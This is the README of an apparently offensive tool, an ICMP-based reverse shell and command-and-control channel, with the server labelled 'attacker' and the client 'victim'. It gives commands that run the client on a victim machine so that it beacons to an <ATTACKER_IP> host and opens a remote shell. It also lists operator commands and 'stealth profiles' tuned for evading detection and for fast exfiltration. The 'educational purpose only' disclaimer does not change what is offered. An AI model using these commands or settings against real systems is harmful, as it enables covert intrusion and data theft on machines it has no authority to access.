# 🔴 ICMP C2 — Reverse Shell over ICMP

> **Educational purpose only.** Do not use on systems you do not own.

---
## Requirements

- Python 3.8+, Linux, root/sudo on both machines

## Usage

**Server (attacker):**
```
sudo python3 server.py -k mysecretpass
sudo python3 server.py -k mysecretpass -p 128 -v
```
**Client (victim):**
```
sudo python3 client.py -s <ATTACKER_IP> -k mysecretpass
sudo python3 client.py -s 10.0.0.1 -k mysecretpass -i 5 -j 2 -c 32 -p 128
```
**Operator meta-commands:**
```
!list              show connected clients
!target <ip>       switch active target
!help              help
exit               disconnect current client
```
### Server Args

| Arg | Default | Description |
|---|---|---|
| `-k` | required | Shared key |
| `-p` | `0` | Pad payloads to N bytes |
| `-v` | off | Verbose |

### Client Args

| Arg | Default | Description |
|---|---|---|
| `-s` | required | Attacker IP/hostname |
| `-k` | required | Shared key |
| `-i` | `2.0` | Beacon interval (s) |
| `-j` | `0.5` | Jitter (s) |
| `-c` | `512` | Chunk size (bytes) |
| `-p` | `0` | Pad payloads to N bytes |
| `-r` | `3` | Retries per packet |
| `-t` | `3.0` | Reply timeout (s) |

---

## Stealth Profiles

| Profile | Client flags | Server flags |
|---|---|---|
| 🐢 Ultra-stealth | `-p 64 -c 8 -i 10 -j 5` | `-p 64` |
| 🕵️ Balanced | `-p 128 -c 64 -i 5 -j 2` | `-p 128` |
| 🚀 Fast exfil | `-c 512 -i 1 -j 0.2` | (no padding) |

> ⚠️ Both sides must use the same `--padding` value.



